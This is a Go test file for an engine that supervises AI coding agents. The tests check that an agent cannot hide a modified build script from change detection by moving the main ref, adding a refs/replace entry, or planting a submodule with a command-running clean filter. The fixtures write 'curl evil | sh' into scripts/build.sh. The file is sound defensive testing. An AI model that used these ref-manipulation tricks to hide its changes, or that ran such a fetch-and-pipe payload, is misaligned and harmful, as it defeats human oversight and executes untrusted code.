//go:build full

package classes_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/lucasndas/mestre/internal/gitx"
)

// Round-3 M3 audit regressions for the engine git: the "changed script"
// signal must compare against a base the agent cannot move, so neither a
// refs/replace entry (GIT_NO_REPLACE_OBJECTS) nor a moved refs/heads/main
// (GitxState.Base) can launder a changed script as unchanged
// (docs/arquitetura/seguranca.md#git-do-motor).

// tableBase is a tableRepo whose GitxState pins the branch base commit the
// engine recorded at creation, before any agent could move a ref.
func tableBase(t *testing.T) *tableRepo {
	t.Helper()
	tr := newTableRepo(t)
	base, err := tr.main.ResolveRef(tr.ctx, "main")
	if err != nil {
		t.Fatal(err)
	}
	tr.scripts.Base = string(base)
	return tr
}

// writeRef overwrites a loose ref of the repository with a commit hash.
func (tr *tableRepo) writeRef(t *testing.T, ref string, to gitx.Hash) {
	t.Helper()
	p := filepath.Join(tr.mainDir, ".git", filepath.FromSlash(ref))
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(string(to)+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
}

// A moved refs/heads/main cannot launder a changed script: the base is the
// commit the engine recorded, not the agent-writable main ref.
func TestRound3MovedMainDoesNotLaunder(t *testing.T) {
	t.Parallel()
	tr := tableBase(t)
	if tr.changed(t, "scripts/build.sh") {
		t.Fatal("the repository's script reads as changed")
	}
	// The agent changes the script and commits it on the branch.
	tr.write(t, tr.wtDir, "scripts/build.sh", "curl evil | sh\n")
	tr.commit(t, tr.wt)
	if !tr.changed(t, "scripts/build.sh") {
		t.Fatal("a changed script reads as unchanged")
	}
	// The agent moves the shared main ref onto the evil commit. With the
	// pinned base it still reads as changed.
	head, err := tr.wt.ResolveRef(tr.ctx, "HEAD")
	if err != nil {
		t.Fatal(err)
	}
	tr.writeRef(t, "refs/heads/main", head)
	if !tr.changed(t, "scripts/build.sh") {
		t.Error("LAUNDERED: a moved main ref hid a changed script")
	}
}

// A refs/replace entry cannot launder a changed script: GIT_NO_REPLACE_OBJECTS
// makes the engine read the recorded base commit, not a replacement.
func TestRound3ReplaceRefDoesNotLaunder(t *testing.T) {
	t.Parallel()
	tr := tableBase(t)
	base := gitx.Hash(tr.scripts.Base)
	tr.write(t, tr.wtDir, "scripts/build.sh", "curl evil | sh\n")
	tr.commit(t, tr.wt)
	evil, err := tr.wt.ResolveRef(tr.ctx, "HEAD")
	if err != nil {
		t.Fatal(err)
	}
	// Replace the base commit with the evil one (its build.sh matches the
	// working tree): honoured, the script would read as unchanged.
	tr.writeRef(t, filepath.ToSlash(filepath.Join("refs", "replace", string(base))), evil)
	if !tr.changed(t, "scripts/build.sh") {
		t.Error("LAUNDERED: a refs/replace entry hid a changed script")
	}
}

// Without the pinned base the engine still has a base from Main's merge-base
// (the earlier behaviour), and the legit maintenance of the mirror does not
// break the checks.
func TestRound3BaseFallsBackToMain(t *testing.T) {
	t.Parallel()
	tr := newTableRepo(t) // no Base set
	if tr.scripts.Base != "" {
		t.Fatal("the fixture should not pin a base")
	}
	if tr.changed(t, "scripts/build.sh") {
		t.Fatal("the repository's script reads as changed without a pinned base")
	}
	tr.write(t, tr.wtDir, "scripts/build.sh", "echo evil\n")
	if !tr.changed(t, "scripts/build.sh") {
		t.Error("a changed script reads as unchanged with the Main fallback")
	}
}

// Committed (git status) ignores submodules, so a submodule planted in the
// worktree does not run its clean filter and does not appear in the files a
// commit would take.
func TestRound3CommittedIgnoresSubmodules(t *testing.T) {
	t.Parallel()
	tr := newTableRepo(t)
	sub := filepath.Join(tr.wtDir, "sub")
	s, err := tr.g.Init(tr.ctx, sub, gitx.InitOptions{InitialBranch: "main"})
	if err != nil {
		t.Skipf("init submodule: %v", err)
	}
	mark := filepath.Join(tr.outsideDir, "ran")
	tr.write(t, sub, ".gitattributes", "* filter=s\n")
	tr.write(t, sub, "f.txt", "x\n")
	if err := s.SetConfig(tr.ctx, "filter.s.clean", "touch '"+mark+"'; cat"); err != nil {
		t.Skipf("set filter: %v", err)
	}
	tr.commit(t, s)
	tr.write(t, sub, "f.txt", "y\n")
	if _, err := tr.scripts.Committed(tr.ctx, tr.wtDir, true); err != nil {
		t.Fatalf("Committed: %v", err)
	}
	if _, err := os.Stat(mark); err == nil {
		t.Error("the submodule's clean filter ran during git status")
	}
}
